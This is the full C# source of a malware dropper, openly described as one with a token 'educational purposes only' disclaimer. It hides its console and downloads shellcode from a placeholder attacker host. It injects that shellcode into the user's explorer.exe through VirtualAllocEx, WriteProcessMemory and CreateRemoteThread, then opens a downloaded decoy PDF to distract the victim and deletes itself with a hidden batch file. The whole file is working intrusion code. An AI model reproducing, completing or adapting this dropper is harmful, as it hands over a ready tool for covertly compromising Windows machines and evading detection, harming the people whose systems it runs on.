// This Dropper is a simple C# Program that downloads shellcode from a remote server, injects it into a legitimate process (explorer.exe), 
// and then downloads and opens a decoy PDF file. It also includes functionality to self-delete after successful injection.

// THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY.
// DO NOT USE IT FOR MALICIOUS PURPOSES.

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace ExplorerInjection
{
    class Program
    {
        // --- Win32 API Imports ---
        // Used for process manipulation and memory allocation in the target process
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // --- Constants ---
        const int SW_HIDE = 0; // Used to hide the console window
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF; // Full access to the target process
        const uint MEM_COMMIT = 0x1000; // Memory allocation type
        const uint PAGE_EXECUTE_READWRITE = 0x40; // Memory protection flag

        static void Main()
        {
            // Hide console window to avoid detection
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            // URLs for downloading shellcode and decoy PDF
            string shellcodeUrl = "http://<attacker_ip>:<attacker_port>/shellcode.bin";
            string decoyPdfUrl = "http://<attacker_ip>:<attacker_port>/decoy.pdf";
            string decoyPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads", "PhamThanhSang-SOC-L1.pdf");

            try
            {
                // --- Download shellcode ---
                byte[] shellcode;
                using (WebClient client = new WebClient())
                {
                    shellcode = client.DownloadData(shellcodeUrl); // Download shellcode from the remote server
                }

                // --- Get explorer.exe process of the current user session ---
                Process[] explorers = Process.GetProcessesByName("explorer");
                Process explorer = null;
                int currentSessionId = Process.GetCurrentProcess().SessionId; // Get the current session ID

                foreach (var proc in explorers)
                {
                    if (proc.SessionId == currentSessionId) // Match the session ID to find the correct explorer.exe
                    {
                        explorer = proc;
                        break;
                    }
                }

                if (explorer == null) return; // Exit if no explorer.exe process is found

                // --- Inject shellcode into explorer.exe ---
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, explorer.Id); // Open explorer.exe process
                if (hProcess == IntPtr.Zero) return;

                IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Allocate memory in explorer.exe
                if (allocAddr == IntPtr.Zero) return;

                UIntPtr bytesWritten;
                bool writeResult = WriteProcessMemory(hProcess, allocAddr, shellcode, (uint)shellcode.Length, out bytesWritten); // Write shellcode to allocated memory
                if (!writeResult) return;

                IntPtr thread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, IntPtr.Zero); // Create a remote thread to execute the shellcode
                if (thread == IntPtr.Zero) return;

                // --- Download and open decoy PDF ---
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(decoyPdfUrl, decoyPath); // Download the decoy PDF file
                    Process.Start(new ProcessStartInfo(decoyPath) { UseShellExecute = true }); // Open the decoy PDF to distract the victim
                }

                // --- Self-delete after successful injection ---
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location; // Get the current executable's path
                string batPath = Path.Combine(Path.GetTempPath(), "delme.bat"); // Path for the batch file

                // Create a batch script to delete the executable and itself
                string batchContent = $@"
                @echo off
                :Repeat
                del ""{exePath}""
                if exist ""{exePath}"" goto Repeat
                del ""%~f0""
                ";

                File.WriteAllText(batPath, batchContent); // Write the batch script to a file

                // Execute the batch file in hidden mode
                Process.Start(new ProcessStartInfo("cmd.exe", $"/c start \"\" \"{batPath}\"")
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
            catch (Exception ex)
            {
                // Log any errors that occur during execution
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}
